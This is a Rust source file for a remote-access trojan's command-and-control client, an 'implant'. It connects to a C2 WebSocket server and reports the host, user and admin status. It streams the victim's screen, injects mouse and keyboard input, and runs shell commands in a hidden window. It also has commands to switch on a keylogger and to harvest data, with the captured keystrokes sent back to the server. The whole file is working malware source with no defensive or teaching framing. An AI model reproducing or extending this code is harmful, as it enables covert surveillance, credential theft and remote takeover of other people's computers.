//! C2 client: connect → hello → reader loop + frame streamer.
//! Compiles on any platform; capture/input/persistence are Windows-only
//! and are stubbed on other targets so the wire logic still type-checks.

use std::sync::Arc;
use std::time::Duration;

use futures_util::{SinkExt, StreamExt};
use serde_json::json;
use tokio::sync::{mpsc, RwLock};
use tokio_tungstenite::tungstenite::Message;

const C2_URL: &str = match option_env!("C2_URL") {
    Some(u) => u,
    None => "ws://127.0.0.1:8080/ws/implant",
};

#[derive(Clone, Copy)]
struct StreamCfg {
    fps: u32,
    quality: u8,
    scale: f32,
}

pub async fn run() {
    loop {
        if let Err(e) = connect_and_run().await {
            eprintln!("[c2] session ended: {e} — retrying in 5s");
        }
        tokio::time::sleep(Duration::from_secs(5)).await;
    }
}

async fn connect_and_run() -> Result<(), String> {
    let (ws, _) = tokio_tungstenite::connect_async(C2_URL)
        .await
        .map_err(|e| format!("connect failed ({C2_URL}): {e}"))?;
    let (mut write, mut read) = ws.split();

    // One writer owns the socket; reader + frame pump fan in through this.
    let (out_tx, mut out_rx) = mpsc::channel::<Message>(64);
    let writer = tokio::spawn(async move {
        while let Some(m) = out_rx.recv().await {
            if write.send(m).await.is_err() {
                break;
            }
        }
    });

    let cfg = Arc::new(RwLock::new(StreamCfg {
        fps: 8,
        quality: 45,
        scale: 0.5,
    }));

    // Keylogger flushes through this connection's writer; re-point on every
    // reconnect so captured text follows the live socket.
    #[cfg(windows)]
    crate::keylog::set_sink(out_tx.clone());

    // ---- hello ----
    let hello = json!({
        "t": "hello",
        "id": uuid::Uuid::new_v4().to_string(),
        "host": hostname(),
        "user": username(),
        "os": os_label(),
        "arch": std::env::consts::ARCH,
        "pid": std::process::id(),
        "admin": is_admin(),
        "screen": screen_wh(),
    });
    out_tx
        .send(Message::Text(hello.to_string()))
        .await
        .map_err(|_| "writer gone".to_string())?;

    // ---- frame pump (Windows only) ----
    let pump = {
        let out_tx = out_tx.clone();
        let cfg = cfg.clone();
        tokio::spawn(async move { frame_loop(out_tx, cfg).await })
    };

    // ---- reader: mouse / key / cmd / set / ping from server ----
    let mut reader_ok = false;
    while let Some(msg) = read.next().await {
        let msg = match msg {
            Ok(m) => m,
            Err(e) => {
                eprintln!("[c2] read error: {e}");
                break;
            }
        };
        match msg {
            Message::Text(t) => {
                let v: serde_json::Value = match serde_json::from_str(&t) {
                    Ok(v) => v,
                    Err(_) => continue,
                };
                match v.get("t").and_then(|x| x.as_str()).unwrap_or("") {
                    "ping" => {
                        let id = v.get("id").and_then(|x| x.as_u64()).unwrap_or(0);
                        let _ = out_tx
                            .send(Message::Text(json!({"t":"pong","id":id}).to_string()))
                            .await;
                    }
                    "mouse" => {
                        #[cfg(windows)]
                        {
                            let (sw, sh) = screen_wh_pair();
                            crate::input::mouse(
                                f(&v, "x", 0.0),
                                f(&v, "y", 0.0),
                                &s(&v, "btn"),
                                &s(&v, "act"),
                                sw as i32,
                                sh as i32,
                            );
                        }
                    }
                    "key" => {
                        #[cfg(windows)]
                        {
                            let vk = v.get("vk").and_then(|x| x.as_u64()).unwrap_or(0) as u16;
                            let down = v.get("down").and_then(|x| x.as_bool()).unwrap_or(true);
                            crate::input::key(vk, down);
                        }
                    }
                    "cmd" => {
                        let id = s(&v, "id");
                        let line = s(&v, "line");
                        let out_tx = out_tx.clone();
                        tokio::task::spawn_blocking(move || {
                            let out = run_shell(&line);
                            let resp =
                                json!({"t":"cmd_result","id":id,"out":out}).to_string();
                            let _ = out_tx.blocking_send(Message::Text(resp));
                        });
                    }
                    "set" => {
                        let mut c = cfg.write().await;
                        if let Some(x) = v.get("fps").and_then(|x| x.as_u64()) {
                            c.fps = x.clamp(1, 15) as u32;
                        }
                        if let Some(x) = v.get("quality").and_then(|x| x.as_u64()) {
                            c.quality = x.clamp(20, 80) as u8;
                        }
                        if let Some(x) = v.get("scale").and_then(|x| x.as_f64()) {
                            c.scale = (x as f32).clamp(0.3, 1.0);
                        }
                    }
                    "harvest" => {
                        #[cfg(windows)]
                        {
                            let req = v.clone();
                            let out_tx = out_tx.clone();
                            tokio::spawn(async move {
                                crate::harvest::run(req, out_tx).await;
                            });
                        }
                    }
                    "keylog" => {
                        #[cfg(windows)]
                        {
                            let on = v.get("on").and_then(|x| x.as_bool()).unwrap_or(false);
                            crate::keylog::set_enabled(on);
                            let _ = out_tx
                                .send(Message::Text(
                                    json!({"t":"keylog_state","on":on}).to_string(),
                                ))
                                .await;
                        }
                    }
                    _ => {}
                }
            }
            Message::Ping(_) => {}
            Message::Pong(_) => {}
            Message::Close(_) => {
                reader_ok = true;
                break;
            }
            _ => {}
        }
    }

    pump.abort();
    writer.abort();
    if reader_ok {
        Ok(())
    } else {
        Err("socket lost".into())
    }
}

async fn frame_loop(out_tx: mpsc::Sender<Message>, cfg: Arc<RwLock<StreamCfg>>) {
    // Non-Windows builds only validate the wire logic; no capture backend.
    #[cfg(not(windows))]
    {
        let _ = (out_tx, cfg);
    }

    #[cfg(windows)]
    loop {
        let c = *cfg.read().await;
        let period = Duration::from_millis(1000 / c.fps.max(1) as u64);
        if let Some((_w, _h, jpeg)) = crate::capture::grab(c.quality, c.scale) {
            let mut frame = Vec::with_capacity(jpeg.len() + 1);
            frame.push(0x01u8);
            frame.extend_from_slice(&jpeg);
            if out_tx.send(Message::Binary(frame)).await.is_err() {
                break;
            }
        }
        tokio::time::sleep(period).await;
    }
}

pub(crate) fn run_shell(line: &str) -> String {
    #[cfg(windows)]
    let child = {
        use std::os::windows::process::CommandExt;
        std::process::Command::new("cmd.exe")
            .args(["/C", line])
            .creation_flags(0x0800_0000) // CREATE_NO_WINDOW
            .output()
    };
    #[cfg(not(windows))]
    let child = std::process::Command::new("sh")
        .args(["-c", line])
        .output();

    match child {
        Ok(o) => {
            let mut s = String::from_utf8_lossy(&o.stdout).into_owned();
            let e = String::from_utf8_lossy(&o.stderr);
            if !e.is_empty() {
                s.push_str(&e);
            }
            if s.is_empty() {
                s = format!("[exit {}]", o.status);
            }
            s.chars().take(64 * 1024).collect()
        }
        Err(e) => format!("[spawn failed: {e}]"),
    }
}

// ---- environment helpers (best-effort, Windows-aware) ----

pub(crate) fn hostname() -> String {
    std::env::var("COMPUTERNAME")
        .or_else(|_| std::env::var("HOSTNAME"))
        .unwrap_or_else(|_| "?".into())
}

pub(crate) fn username() -> String {
    std::env::var("USERNAME")
        .or_else(|_| std::env::var("USER"))
        .unwrap_or_else(|_| "?".into())
}

pub(crate) fn os_label() -> String {
    #[cfg(windows)]
    {
        "Windows 10/11".to_string()
    }
    #[cfg(not(windows))]
    {
        std::env::consts::OS.to_string()
    }
}

pub(crate) fn is_admin() -> bool {
    #[cfg(windows)]
    {
        // Cheap, reliable check: writing to the Windows dir requires elevation.
        let p = std::env::var_os("WINDIR").map(|w| {
            let mut p = std::path::PathBuf::from(w);
            p.push("__adm_test.tmp");
            p
        });
        match p {
            Some(p) => match std::fs::write(&p, b"x") {
                Ok(_) => {
                    let _ = std::fs::remove_file(&p);
                    true
                }
                Err(_) => false,
            },
            None => false,
        }
    }
    #[cfg(not(windows))]
    {
        false
    }
}

fn screen_wh() -> [u32; 2] {
    let (w, h) = screen_wh_pair();
    [w, h]
}

fn screen_wh_pair() -> (u32, u32) {
    #[cfg(windows)]
    {
        crate::capture::screen_size()
    }
    #[cfg(not(windows))]
    {
        (0, 0)
    }
}

#[allow(dead_code)] // used only by the Windows mouse handler
fn f(v: &serde_json::Value, k: &str, d: f64) -> f32 {
    v.get(k).and_then(|x| x.as_f64()).unwrap_or(d) as f32
}

fn s(v: &serde_json::Value, k: &str) -> String {
    v.get(k)
        .and_then(|x| x.as_str())
        .unwrap_or("")
        .chars()
        .take(4096)
        .collect()
}
